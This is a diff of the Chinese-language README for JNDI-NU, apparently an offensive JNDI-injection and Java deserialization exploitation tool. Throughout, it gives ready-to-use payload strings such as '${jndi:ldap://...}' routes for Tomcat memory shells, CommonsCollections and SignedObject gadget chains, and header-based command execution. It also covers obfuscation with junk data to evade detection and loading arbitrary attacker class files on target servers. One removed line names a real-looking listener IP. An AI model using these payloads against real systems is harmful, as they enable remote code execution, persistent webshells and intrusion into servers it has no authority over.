@@ -18,10 +18,9 @@ Usage: java -jar JNDI-NU.jar [options]
 
 * 目前支持的所有 ```PayloadType``` 为
     * ```Bypass```: 用于rmi本地工程类加载，通过添加自定义```header``` ```nu1r: whoami``` 的方式传递想要执行的命令
-    * ```TomcatEcho```: 用于在中间件为 ```Tomcat``` 时命令执行结果的回显，通过添加自定义```header``` ```nu1r: whoami```
-      的方式传递想要执行的命令
-    * ```SpringEcho```: 用于在框架为 ```SpringMVC/SpringBoot```
-      时命令执行结果的回显，通过添加自定义```header``` ```nu1r: whoami``` 的方式传递想要执行的命令
+    * ```TomcatEcho```: 用于在中间件为 ```Tomcat``` 时命令执行结果的回显，通过添加自定义```header``` ```nu1r: whoami```的方式传递想要执行的命令
+    * ```SpringEcho```: 用于在框架为 ```SpringMVC/SpringBoot``` 时命令执行结果的回显，通过添加自定义```header``` ```nu1r: whoami``` 的方式传递想要执行的命令
+    * ```nu1r```：用于执行命令，如果命令有特殊字符，支持对命令进行 Base64编码后传输
 
 - 支持tomcatBypass路由直接上线msf：
 
@@ -50,7 +49,7 @@ Usage: java -jar JNDI-NU.jar [options]
 
 ```
 {{url
-    (${jndi:ldap://0.0.0.0:1389/TomcatBypass/JBossServlet/urlr/urlls-bx-obscure)
+  (${jndi:ldap://0.0.0.0:1389/TomcatBypass/TomcatListenerJmx/shell/route-bx-obscure})
 }}
 ```
 
@@ -59,7 +58,7 @@ Usage: java -jar JNDI-NU.jar [options]
 
 ```
 {{url
-    (${jndi:ldap://0.0.0.0:1389/TomcatBypass/JBossServlet/urlr/route-bx-obscure)
+  (${jndi:ldap://0.0.0.0:1389/TomcatBypass/TomcatListenerJmx/shell/route-bx-obscure})
 }}
 ```
 
@@ -68,7 +67,7 @@ Agent写入：
 
 ```
 {{url
-    (${jndi:ldap://0.0.0.0:1389/TomcatBypass/JBossServlet/urlr/rlls-bx-linAgent)
+  (${jndi:ldap://0.0.0.0:1389/TomcatBypass/TomcatListenerJmx/shell/route-bx-linAgent})
 }}
 ```
 
@@ -97,7 +96,7 @@ Agent写入：
 
 ---
 
-# 👻其他利用链的拓展
+# 👻 BeanShell1 与 Clojure 利用链的拓展
 
 对于 `BeanShell1` 及 `Clojure` 这两个基于脚本语言解析的漏利用方式。
 
@@ -187,14 +186,14 @@ WF ：Write File - 通过 FileOutputStream.write() 来写入文件，使用命�
 * `cc`,`cc4`,`cb`,`hibernate`,`rome`,`rhino`,`spring`
 
 * 利用方式：
-* SignedObjectPayload -> 'CC:CommonsCollections6:b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==:10000' 20000
+* SignedObjectPayload -> 'CC:CommonsCollections6:b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==:1:10000' 最后两个参数是反序列化的类型
 
 ```
 {{url
-    (${jndi:ldap://42.192.234.204:1389/Deserialization/SignedObject/nu1r/Base64/{{base64
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/SignedObject/nu1r/Base64/{{base64
         (CC:commonscollections6:{{base64
             (open -a Calculator.app)
-        }}:10000)
+        }}1::10000)
     }}})
 }}
 ```
@@ -276,6 +275,25 @@ WF ：Write File - 通过 FileOutputStream.write() 来写入文件，使用命�
 
 ![](https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown微信截图_20220803131020.png)
 
+* 使用dt与dl指定混淆的方式： `dt` 指定混淆类型，默认为1， `dl` 指定脏数据大小，默认为5000
+
+当dt值为1时，随机使用 ArrayList/LinkedList/HashMap/LinkedHashMap/TreeMap 等集合类型来封装 object
+
+当dt值为2时，使用循环嵌套 LinkedList 来封装 object
+
+当dt值为3时，在 TC_RESET 中加入脏数据
+
+使用示例
+```
+{{url
+  (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections6/nu1r/Base64/{{base64
+      (whoami-dt-1-dl-5000)
+  }}})
+}}
+```
+
+
+
 ---
 对于Gadget：
 
@@ -287,6 +305,8 @@ WF ：Write File - 通过 FileOutputStream.write() 来写入文件，使用命�
 - CommonsCollections7
 - commonscollectionsK5
 - CommonsCollections9
+
+* 使用 `Transformer[]` 数组实现
 
 为其拓展了除了 Runtime 执行命令意外的多种利用方式，具体如下：
 
@@ -383,7 +403,37 @@ BC ：BCEL Classloader - 通过 ..bcel...ClassLoader.loadClass().newInstance() �
 }}
 ```
 
-# 利用链探测
+# 🐣其他利用链拓展
+
+对于除了以上的利用链,使用的是 `TemplatesImpl` 类来实现。
+
+* 继承恶意类 `AbstractTranslet` : 默认不继承，于执行命令的后面加 `inherit`
+```
+{{url
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections3/nu1r/Base64/{{base64
+        (whoami-inherit)
+    }}})
+}}
+```
+
+## 🐮任意自定义代码
+
+对于使用了 `TemplatesImpl` 类来实现的链子来说，可以使用此方法
+
+如果你不想使用本项目中提供的恶意逻辑，也不想执行命令，可以通过自定义代码的形式，自定义代码将会在目标服务器通过 `ClassLoader` 进行加载并实例化。命令使用 `LF#` 开头，后面跟指定自定义类字节码文件的绝对路径。
+
+示例：
+
+**class 类文件绝对路径**
+```
+{{url
+  (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections3/nu1r/Base64/{{base64
+      (LF#/tmp/evil.class-org.su18.Evil)
+  }}})
+}}
+```
+
+# 🦜利用链探测
 
 示例：all:xxxxxx.dns.log
 
@@ -394,6 +444,11 @@ BC ：BCEL Classloader - 通过 ..bcel...ClassLoader.loadClass().newInstance() �
     }}})
 }}
 ```
+
+效果图：
+
+![](https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownQQ截图20221107151444.png)
+
 
 # 🐳自定义
 
